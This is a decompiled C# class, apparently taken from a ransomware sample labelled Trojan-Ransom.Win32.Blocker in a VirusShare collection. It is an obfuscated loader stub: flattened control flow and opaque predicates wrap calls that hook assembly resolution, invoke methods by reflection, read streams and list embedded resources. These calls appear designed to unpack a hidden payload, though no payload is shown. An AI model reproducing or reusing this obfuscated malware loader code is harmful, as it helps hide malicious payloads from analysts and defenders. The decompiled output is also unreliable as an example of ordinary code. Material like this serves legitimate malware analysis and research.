// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Server.packed, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 712FD340-1A8D-4ADA-8620-0D072E5BB482
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bipa-183abe361833d2ddb4e38325acbbb19715b5270dec52a0eb9bb6b99cfb8f1470.exe

using \u0004;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

public sealed class \u0006 : \u0003
{
  private \u0003\u2002.Ⴓ Ⴜ;

  public \u0006()
  {
    this.Ⴜ.\u0001 = (uint) byte.MaxValue;
    this.Ⴜ.\u0001 = true;
    this.Ⴜ.\u0002 = 1024U;
    this.Ⴜ.\u0003 = 4U;
    this.Ⴜ.\u0004 = 1048576U;
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }

  static \u0006() => \u0001.\u0001();

  internal static string Ⴐ([In] ResolveEventArgs obj0, [In] int obj1, [In] int obj2)
  {
    if (false)
      goto label_6;
    else
      goto label_12;
label_1:
    int num1;
    int num2;
    if (true)
      num2 = num1;
    else
      goto label_8;
label_2:
    switch (num2)
    {
      case 0:
      case 3:
      case 6:
        goto label_10;
      case 1:
        return obj0.Name;
      case 2:
      case 7:
        num1 = 4;
        goto label_1;
      case 4:
        goto label_12;
      default:
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.Ⴐ);
        num1 = 4;
        goto label_1;
    }
label_6:
    int num3 = 7;
    goto label_14;
label_8:
    num3 = 1;
    goto label_14;
label_10:
    num1 = 4;
    goto label_1;
label_12:
    int num4 = obj2;
    if (false)
    {
      num2 = num4;
      goto label_2;
    }
    else
    {
      if (true)
        goto label_13;
label_5:
      switch (num4)
      {
        case 0:
          goto label_8;
        default:
          goto label_6;
      }
label_13:
      int num5 = obj1;
      num4 = (num4 ^ num5) - 61;
      goto label_5;
    }
label_14:
    num1 = num3;
    if (false)
      goto label_10;
    else
      goto label_1;
  }

  internal static Process Ⴄ([In] int obj0, [In] int obj1)
  {
label_3:
    if (true)
      goto label_12;
label_1:
    // ISSUE: method reference
    RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.Ⴄ);
    int num1;
    if (true)
      num1 = 6;
label_11:
    while (true)
    {
      switch (num1)
      {
        case 0:
          num1 = 6;
          continue;
        case 1:
          num1 = 6;
          continue;
        case 2:
        case 5:
          if (false)
            goto case 1;
          else
            goto label_14;
        case 6:
          goto label_3;
        default:
          goto label_1;
      }
    }
label_14:
    return Process.GetCurrentProcess();
label_12:
    int num2 = obj1;
    int num3 = obj0;
    if (true)
    {
      int num4 = num2 ^ num3;
      num3 = 16;
      num2 = num4;
    }
    int num5;
    switch (num2 - num3)
    {
      case 0:
        num5 = 2;
        break;
      default:
        num5 = 1;
        break;
    }
    num1 = num5;
    goto label_11;
  }

  internal static string Ⴅ([In] Process obj0, [In] int obj1, [In] int obj2)
  {
label_17:
    int num1 = obj2;
    int num2 = obj1;
    if (true)
    {
      int num3 = num1 ^ num2;
      num2 = 125;
      num1 = num3;
    }
    int num4 = num1 - num2;
    while (true)
    {
      int num5;
      switch (num4)
      {
        case 0:
          num5 = 3;
          break;
        case 1:
label_9:
          num5 = 6;
          break;
        default:
          num5 = 4;
          break;
      }
      int num6 = num5;
      int num7;
      while (true)
      {
        do
          ;
        while (false);
        switch (num6)
        {
          case 0:
          case 2:
          case 5:
            num7 = 1;
            break;
          case 1:
          case 8:
            goto label_17;
          case 3:
            goto label_20;
          case 4:
            int num8 = 1;
            if (num8 == 0)
            {
              num7 = num8;
              break;
            }
            num6 = num8;
            continue;
          case 6:
            goto label_12;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.Ⴅ);
            num6 = 1;
            continue;
        }
        if (num7 != 0)
          num6 = num7;
        else
          break;
      }
      num4 = num7;
      continue;
label_12:
      if (false)
        goto label_9;
      else
        goto label_21;
    }
label_20:
    return obj0.ProcessName;
label_21:
    return obj0.MainWindowTitle;
  }

  internal static void Ⴀ([In] AppDomain obj0, [In] ResolveEventHandler obj1, [In] int obj2, [In] int obj3)
  {
label_0:
    int num1 = 1;
label_1:
    while (true)
    {
      int num2;
      do
      {
        if (true)
        {
          switch (num1)
          {
            case 0:
              goto label_7;
            case 2:
            case 3:
              goto label_11;
            default:
              switch (obj3 ^ obj2)
              {
                case 97:
                  num2 = 2;
                  break;
                default:
                  if (true)
                  {
                    num2 = 0;
                    break;
                  }
                  goto label_7;
              }
              do
                ;
              while (false);
              continue;
          }
        }
        else
          goto label_0;
      }
      while (false);
      num1 = num2;
    }
label_7:
    do
    {
      num1 = 1;
    }
    while (false);
    goto label_1;
label_11:
    obj0.AssemblyResolve += obj1;
  }

  internal static object ႨႣ([In] MethodBase obj0, [In] object obj1, [In] object[] obj2, [In] int obj3, [In] int obj4)
  {
    do
    {
      do
        ;
      while (false);
      switch (obj4 ^ obj3)
      {
        case 16:
          continue;
        default:
          if (false)
            goto label_4;
          else
            continue;
      }
    }
    while (false);
label_4:
    return obj0.Invoke(obj1, obj2);
  }

  internal static int ႨႨ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
  {
    do
    {
      int num1 = obj5;
      int num2;
      while (true)
      {
        int num3 = obj4;
        num2 = (num1 ^ num3) - 42;
        if (false)
          num1 = num2;
        else
          break;
      }
      switch (num2)
      {
        case 0:
          continue;
        default:
          continue;
      }
    }
    while (false);
    return obj0.Read(obj1, obj2, obj3);
  }

  internal static string[] ႨႳ([In] Assembly obj0, [In] int obj1, [In] int obj2)
  {
    do
    {
      int num1 = obj2 ^ obj1;
      int num2;
      while (true)
      {
        num2 = num1 - 2;
        if (false)
          num1 = num2;
        else
          break;
      }
      switch (num2)
      {
        case 0:
          continue;
        default:
          continue;
      }
    }
    while (false);
    return obj0.GetManifestResourceNames();
  }

  [StructLayout(LayoutKind.Auto)]
  internal struct Ⴈ
  {
    internal Ⴈ.Ⴐ[] Ⴍ;
  }

  [StructLayout(LayoutKind.Auto)]
  internal struct Ⴓ
  {
    internal \u0005\u2000.Ⴐ.Ⴗ[] Ⴈ;
    internal int Ⴅ;
    internal int Ⴃ;
    internal uint Ⴍ;
  }
}
